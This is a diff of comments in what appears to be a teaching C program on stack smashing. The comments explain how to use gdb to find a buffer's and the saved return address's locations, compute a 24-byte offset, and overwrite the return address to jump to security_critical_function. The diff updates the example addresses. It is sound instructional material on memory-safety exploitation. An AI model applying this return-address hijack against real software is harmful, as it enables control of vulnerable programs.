@@ -26,7 +26,7 @@
 //    to overflow:
 //
 //    (gdb) p &local_buffer
-//    $1 = (char (*)[16]) 0x7fffffffdbc0
+//    $1 = (char (*)[16]) 0x7fffffffda00
 //
 //    That's an address on the stack and the return address is stored
 //    somewhere above. To find where the return address is I first look for
@@ -34,13 +34,13 @@
 //    (gdb) info frame
 //    [...] 
 //    Saved registers:
-//     rbp at 0x7fffffffdbd0, rip at 0x7fffffffdbd8
+//     rbp at 0x7fffffffda10, rip at 0x7fffffffda18
 //
 //    So the return address (rip is the register containing the instruction
-//    pointer in x86-64) is saved at 0x7fffffffdbd8 on the stack. We now need
+//    pointer in x86-64) is saved at 0x7fffffffda18 on the stack. We now need
 //    to determine the offset between the start of the buffer we want to
 //    overflow and the location of the return address:
-//    0x7fffffffdbd8 - 0x7fffffffdbc0 = 0x18 (i.e. 24 bytes)
+//    0x7fffffffda18 - 0x7fffffffda00 = 0x18 (i.e. 24 bytes)
 //    Conclusion: there are 24 bytes between local_buffer and the return address
 //
 // 3. Next we need to craft our payload, it should be consituted of 24 bytes
@@ -49,7 +49,7 @@
 //    easily:
 //    nm stack-smashing | grep security_critical_function
 //
-//    In my case it is at 0x401c8d:
+//    In my case it is at 0x40175e:
 //    000000000040175e T security_critical_function
 //
 //    So my payload will be: [24 bytes of padding][0x40175e]
